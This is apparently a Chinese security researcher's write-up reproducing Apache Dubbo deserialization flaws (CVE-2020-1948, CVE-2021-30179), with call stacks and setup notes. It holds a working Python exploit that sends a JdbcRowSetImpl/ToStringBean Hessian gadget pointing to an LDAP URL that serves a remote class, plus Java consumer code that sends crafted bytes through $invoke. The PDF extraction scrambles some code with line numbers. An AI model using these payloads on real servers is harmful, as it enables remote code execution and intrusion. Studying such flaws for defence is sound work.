最终⾛到反序列化触发点
此时调⽤栈
doReadRemoteInvocation:144, RemoteInvocationSerializingExporter 
(org.springframework.remoting.rmi)
1
readRemoteInvocation:121, HttpInvokerServiceExporter 
(org.springframework.remoting.httpinvoker)
2
readRemoteInvocation:100, HttpInvokerServiceExporter 
(org.springframework.remoting.httpinvoker)
3
⼆、CVE-2020-1948
Apache Dubbo 2.7.0 ~ 2.7.6
Apache Dubbo 2.6.0 ~ 2.6.7
Apache Dubbo 2.5.x 所有版本 (官⽅不再提供⽀持)
这⾥搭建环境使⽤https://github.com/apache/dubbo-spring-boot-project 
增加依赖
更改代码，为了⽅便直接⽤github现成的环境了
https://github.com/ctlyz123/CVE-2020-1948 这⾥我直接把mashalsec加⼊了依赖
handleRequest:79, HttpInvokerServiceExporter 
(org.springframework.remoting.httpinvoker)
4
handle:216, HttpProtocol$InternalHandler 
(org.apache.dubbo.rpc.protocol.http)
5
service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)
6
service:790, HttpServlet (javax.servlet.http)
7
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
8
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
9
invoke:198, StandardWrapperValve (org.apache.catalina.core)
10
invoke:96, StandardContextValve (org.apache.catalina.core)
11
invoke:496, AuthenticatorBase (org.apache.catalina.authenticator)
12
invoke:140, StandardHostValve (org.apache.catalina.core)
13
invoke:81, ErrorReportValve (org.apache.catalina.valves)
14
invoke:87, StandardEngineValve (org.apache.catalina.core)
15
service:342, CoyoteAdapter (org.apache.catalina.connector)
16
service:803, Http11Processor (org.apache.coyote.http11)
17
process:66, AbstractProcessorLight (org.apache.coyote)
18
process:790, AbstractProtocol$ConnectionHandler (org.apache.coyote)
19
doRun:1468, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
20
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
21
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
22
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
23
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
24
run:745, Thread (java.lang)
25
先启动Provider
在启动customer
或者直接⽤Python脚本打⼀下，但是需要改下service_name
from dubbo.codec.hessian2 import Decoder,new_object
1
from dubbo.client import DubboClient
2
3
client = DubboClient('127.0.0.1', 12345)
4
5
JdbcRowSetImpl=new_object(
6
      'com.sun.rowset.JdbcRowSetImpl',
7
      dataSource="ldap://127.0.0.1:8089/Exploit",
8
      strMatchColumns=["foo"]
9
      )
10
JdbcRowSetImplClass=new_object(
11
      'java.lang.Class',
12
      name="com.sun.rowset.JdbcRowSetImpl",
13
      )
14
漏洞存在于 Apache Dubbo默认使⽤的反序列化⼯具 hessian 中，攻击者可能会通过发送恶意 
RPC 请求来触发漏洞，这类 RPC 请求中通常会带有⽆法识别的服务名或⽅法名，以及⼀些恶
意的参数负载。当恶意参数被反序列化时，达到代码执⾏的⽬的。引⽤⾃：https://www.anqua
nke.com/post/id/209251
上⾯的漏洞是http出了问题，这个是dubbo⽀持的hessian出了问题，简⽽⾔之就是Dubbo协议
中Hessian反序列化漏洞。
主要利⽤Dubbo协议调⽤其他RPC协议时会涉及到数据的序列化和反序列化操作。如果没有
做检查校验很有可能成功反序列化攻击者精⼼构造的恶意类，利⽤java调⽤链使服务端去加
载远程的Class⽂件，通过在Class⽂件的构造函数或者静态代码块中插⼊恶意语句从⽽达到
远程代码执⾏的攻击效果。
Hessian序列化⽅法Demo
突然发现⾃⼰要写的东⻄有个师傅写的很详细了，这⾥直接放上链接
https://www.anquanke.com/post/id/209251
不过看这个漏洞学到了新东⻄，在Hessian反序列化⾥，ysoserial提供的gadget⽆法使⽤，
Hessian反序列化学习https://blog.csdn.net/u011721501/article/details/79443598
这⾥放上⼀张图，等待下次看dubbo源码分析
toStringBean=new_object(
15
      'com.rometools.rome.feed.impl.ToStringBean',
16
      beanClass=JdbcRowSetImplClass,
17
      obj=JdbcRowSetImpl
18
      )
19
20
resp = client.send_request_and_return_response(
21
    service_name='org.apache.dubbo.spring.boot.demo.provider.service.Defau
ltDemoService',
22
    method_name='sayHello',
23
    args=[toStringBean])
24
public class HessianTest {
1
    public static void main(String[] args) throws Exception {
2
        Object o=new User();
3
        ByteArrayOutputStream os = new ByteArrayOutputStream();
4
        Hessian2Output output = new Hessian2Output(os);
5
        output.writeObject(o);
6
        output.close();
7
        System.out.println(os.toString());
8
    }
9
}
10
三、CVE-2021-30179
⽹上没有现成的⽂章复现步骤，只有三梦师傅的代码截图，对dubbo不了解，⼀点点搜，尝试构
造连接请求，中间踩坑多少不提了，有想调试的同学直接跟着写就好了
https://github.com/apache/dubbo-samples 我⽤了这⾥⾯的这个项⽬，因为漏洞关键店在
generic
\dubbo-samples-master\dubbo-samples-generic\dubbo-samples-generic-type
修改org.apache.dubbo.samples.generic.api.UserService
org.apache.dubbo.samples.generic.impl.UserServiceImpl
package org.apache.dubbo.samples.generic.api;
1
2
import java.io.IOException;
3
4
public interface UserService extends Service {
5
    String sayHello(String name,String name1);
6
    String commonTest(Object o) throws IOException;
7
    String $invoke(String name,String[] ccc,Object[] bbb);
8
}
9
package org.apache.dubbo.samples.generic.impl;
1
2
import org.apache.dubbo.samples.generic.api.Params;
3
import org.apache.dubbo.samples.generic.api.User;
4
import org.apache.dubbo.samples.generic.api.UserService;
5
6
import java.io.IOException;
7
8
public class UserServiceImpl implements UserService {
9
10
    @Override
11
    public User get(Params params) {
12
        return new User(Integer.parseInt(params.get("id")), 
params.get("name"));
13
    }
14
15
org.apache.dubbo.samples.generic.GenericConsumer
    @Override
16
    public String sayHello(String name,String name1) {
17
        return "sss";
18
    }
19
20
    @Override
21
    public String commonTest(Object o) throws IOException {
22
        return "ccc";
23
    }
24
25
    @Override
26
    public String $invoke(String name, String[] ccc, Object[] bbb) {
27
        return "iii";
28
    }
29
}
30
package org.apache.dubbo.samples.generic;
1
2
import org.apache.dubbo.rpc.service.GenericService;
3
import org.apache.dubbo.samples.generic.api.Params;
4
import org.apache.dubbo.samples.generic.api.User;
5
import org.apache.dubbo.samples.generic.api.UserService;
6
7
import org.springframework.context.support.ClassPathXmlApplicationContext;
8
9
import java.util.HashMap;
10
import java.util.Map;
11
12
public class GenericConsumer {
13
14
    public static void main(String[] args) throws Exception {
15
        ClassPathXmlApplicationContext context = new 
ClassPathXmlApplicationContext("spring/generic-type-consumer.xml");
16
        context.start();
17
        UserService userService = (UserService) 
context.getBean("userService");
18
        String[] ccc = {"java.lang.String","java.lang.String"};
19
        byte[] bytes1 = new byte[]{-54, -2, 。。。};
20
        byte[] bytes2 = new byte[]{-54, -2, 。。。。};
21
22
23
        Object[] bbb = {bytes1,bytes2};
24
        userService.$invoke("sayHello",ccc,bbb);
25
26
//        UserService userService = (UserService) 
context.getBean("userService");
27
//        Map map = new HashMap<>();
28
//        map.put("id", "1");
29
generic-type-consumer.xml
更改zk地址为⾃⼰的zk地址
privder配置如下
cuntomer配置如下
//        map.put("name", "Charles");
30
//        Params params = new Params(map);
31
//        User user = userService.get(params);
32
//
33
//        System.out.println(user);
34
    }
35
}
36
provider启动后，启动cuntomer，成功进⼊readObject逻辑
调⽤栈如下
重点还是在
invoke:91, GenericFilter (org.apache.dubbo.rpc.filter)
1
invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
2
invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
3
invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
4
invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
5
invoke:81, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
6
reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
7
handleRequest:100, HeaderExchangeHandler 
(org.apache.dubbo.remoting.exchange.support.header)
8
received:175, HeaderExchangeHandler 
(org.apache.dubbo.remoting.exchange.support.header)
9
received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
10
run:57, ChannelEventRunnable 
(org.apache.dubbo.remoting.transport.dispatcher)
11
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
12
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
13
run:745, Thread (java.lang)
14
以及userService的参数构造
五、CVE-2021-30181
https://articles.zsxq.com/id_b0ngrui87nft.html
六、参考连接
https://wx.zsxq.com/dweb2/index/group/555848225184
https://articles.zsxq.com/id_pv19zdgj03h5.html
https://wx.zsxq.com/dweb2/index/topic_detail/182885252184842
https://l3yx.github.io/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%8
8%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%
94%E8%AE%B0/#CVE-2020-1948
https://y4er.com/post/apache-dubbo-cve-2019-17564/
1